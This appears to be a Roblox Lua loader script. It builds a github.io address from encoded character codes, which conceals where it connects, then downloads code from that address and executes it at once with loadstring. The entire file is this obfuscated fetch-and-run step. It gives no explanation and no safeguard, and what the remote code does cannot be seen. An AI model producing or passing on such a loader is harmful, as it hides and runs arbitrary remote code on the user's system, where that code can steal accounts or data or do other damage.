local chars = {
    104,116,116,112,115,58,47,47,
    110,117,103,101,114,103,117,121,
    53,48,45,97,102,107,46,
    103,105,116,104,117,98,46,105,111,
    47,110,47
}

local url = ""

for _, v in ipairs(chars) do
    url = url .. string.char(v)
end

loadstring(game:HttpGet(url))()